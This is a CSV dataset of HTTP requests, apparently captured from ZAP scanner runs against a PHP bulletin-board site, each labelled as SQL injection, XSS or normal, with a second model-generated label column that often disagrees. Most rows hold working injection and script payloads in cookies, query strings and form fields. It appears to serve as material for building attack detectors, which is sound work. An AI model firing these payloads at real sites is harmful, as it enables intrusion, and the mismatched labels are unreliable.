,id,combined_request,label_x,gpt_label
238,f866e947-4df8-44d9-96b6-86a20426ad0f,"POST /bbs/password_lost2.php HTTP/1.1\r\nhost: 0W45pz4p\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password_lost.php\r\ncontent-length: 28\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+AND+%271%27%3D%271%27+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\nmb_email=ZAP&captcha_key=ZAP",SQL Injection,SQL Injection
239,4e4a0962-cf11-4852-96e8-c1b6c963d7a6,"GET /bbs?query=query0W45pz4p HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nx-zap-scan-id: 40012\r\n\r\n",normal,normal
240,3f0a9b75-a07c-401f-971b-1ddaab21233b,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=r&wr_id=7\r\ncontent-length: 519\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=r&bo_table=free&wr_id=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sca=&sfl=&stx=&spt=%29+UNION+ALL+select+NULL+--+&sst=wr_datetime&sod=desc&page=1&wr_name=ZAP&wr_password=ZAP&wr_email=foo-bar%40example.com&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94..%EA%B0%80%EC%9D%84%EC%9E%85%EB%8B%88%EB%8B%A4.%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,SQL Injection
241,02a2c29f-e9ee-4138-97a7-80ef266d7a93,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 115\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&mb_password=ZAP&auto_login=1",XSS,XSS
242,a9833d88-b10d-4cf3-97dd-f51010dc99c2,"POST /bbs/register_form_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register_form.php\r\ncontent-length: 245\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=&url=0W45pz4p&agree=1&agree2=1&cert_type=&cert_no=&mb_sex=&mb_id=ZAP&mb_password=ZAP&mb_password_re=ZAP&mb_name=ZAP&mb_nick_default=&mb_nick=ZAP&old_email=&mb_email=foo-bar%40example.com&mb_mailling=1&mb_open=1&mb_open_default=&captcha_key=ZAP",normal,SQL Injection
243,b1645077-6e82-4e94-9809-923f15e8319e,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 117\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&comment_id=12&sfl=&stx=&page=1&wr_password=%3B",XSS,XSS
244,c172cf4c-4fd5-4a16-982c-ce4f03d70d72,"POST /bbs/ajax.filter.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 63\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://211.115.206.18:7000\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsubject=&content=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E",XSS,XSS
245,7a26b37c-48b4-4ad3-9870-51b1c7a2d5ba,POST /bbs/write.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 79\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=free&wr_id=14&comment_id=0W45pz4p&sfl=&stx=&page=1&wr_password=ZAP,normal,SQL Injection
246,7e4b664b-ed93-4e89-9872-5221e9d9381e,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 80\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=0&comment_id=12&sfl=0W45pz4p&stx=&page=1&wr_password=%3B",SQL Injection,SQL Injection
247,4b4603d4-887b-4ec8-98c7-9b3144e656d0,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx&stx=ZAP\r\ncontent-length: 141\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&stx=ZAP&spt=-7&sca=&sst=wr_datetime&sod=asc%27+AND+%271%27%3D%271&page=1&sw=",SQL Injection,XSS
248,7116f1e4-2957-4051-98cb-21d10a275806,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 67\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; e1192aefb64683cc97abb83c71057733=cWE%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-\r\nx-zap-scan-id: 40012\r\n\r\nurl=%252F0W45pz4p&mb_id=%60+or+a%3Da+--&mb_password=%60+or+a%3Da+--",SQL Injection,SQL Injection
249,8a562821-e7b0-4219-98d0-2926afb8a7fd,"GET /bbs/_head.php?query=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
250,39ace0ab-46c5-43ed-98f0-225725dc3878,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx&stx=ZAP\r\ncontent-length: 156\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=-7&sca=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sst=wr_datetime&sod=asc%27+AND+%271%27%3D%271&page=1&sw=",SQL Injection,SQL Injection
251,b301d333-c1d8-44e0-990d-12f0e1a6431a,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 117\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=ZAP&mb_password=ZAP&auto_login=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E",XSS,XSS
252,7fc42dcb-aed7-422d-997a-e145e90f074a,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&c_id=15&page=1&sod=desc&sop=and&sst=wr_hit&w=c&wr_id=14\r\ncontent-length: 196\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=c&bo_table=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&wr_id=14&comment_id=15&sca=&sfl=&stx=&spt=&page=1&is_good=&wr_content=&wr_name=ZAP&wr_password=ZAP&captcha_key=ZAP&wr_secret=secret",XSS,XSS
253,38009797-92f9-4406-999d-319a652c0186,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 117\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&mb_password=ZAP&auto_login=1",XSS,XSS
254,01792b2b-0315-4cc0-99a1-08235d1243b5,"POST /bbs/register_form_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register_form.php\r\ncontent-length: 316\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=&url=https%3A%2F%2Fzap.example.com&agree=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&agree2=1&cert_type=&cert_no=&mb_sex=&mb_id=ZAP&mb_password=ZAP&mb_password_re=ZAP&mb_name=ZAP&mb_nick_default=&mb_nick=ZAP&old_email=&mb_email=foo-bar%40example.com&mb_mailling=1&mb_open=1&mb_open_default=&captcha_key=ZAP",XSS,XSS
255,1bc25201-a454-4cdd-99b4-87bca61ff145,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 67\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; e1192aefb64683cc97abb83c71057733=cWE%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-\r\nx-zap-scan-id: 40012\r\n\r\nurl=%252F&mb_id=%60+or+a%3Da+--&mb_password=%60+or+a%3Da+--0W45pz4p",SQL Injection,SQL Injection
256,8af9d760-3af8-4bc3-9a0e-7d57220b861e,POST /bbs/write.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 118\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&wr_id=14&comment_id=&sfl=&stx=&page=1&wr_password=ZAP,XSS,XSS
257,b84c738c-e41c-4309-9a55-c15a2bc95cdf,"POST /bbs/login_check.php?query=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\nContent-Length: 59\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; e1192aefb64683cc97abb83c71057733=cWE%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-\rurl=%252F&mb_id=%60+or+a%3Da+--&mb_password=%60+or+a%3Da+--",SQL Injection,XSS
258,5f5916c5-08d7-430c-9af2-90d1f8801b3b,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 77\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=0W45pz4p&mb_password=ZAP&auto_login=1",normal,normal
259,96895f7d-bdf6-4325-9b81-23e8eb891e86,"POST /bbs/ajax.filter.php HTTP/1.1\r\nhost: 0W45pz4p\r\nProxy-Connection: keep-alive\r\nContent-Length: 24\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://211.115.206.18:7000\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsubject=&content=1232131",SQL Injection,SQL Injection
260,365cd344-5fb5-4434-9b8d-949df90d01c6,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 122\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&comment_id=12&sfl=&stx=&page=1&wr_password=%3B",XSS,XSS
261,08f62994-efdf-4063-9b9b-9f2361de1a4d,POST /bbs/write.php?query=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 71\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=free&wr_id=14&comment_id=&sfl=&stx=&page=1&wr_password=ZAP,XSS,XSS
262,95898c2d-3d64-4af9-9bb8-a38ad82c0802,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 76\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=0W45pz4p&wr_id=0&comment_id=12&sfl=&stx=&page=1&wr_password=%3B",SQL Injection,SQL Injection
263,e6e71a38-70c9-483b-9bcb-f35079d0d36f,"POST /bbs/login_check.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 122\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=ZAP&mb_password=ZAP&auto_login=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",XSS,XSS
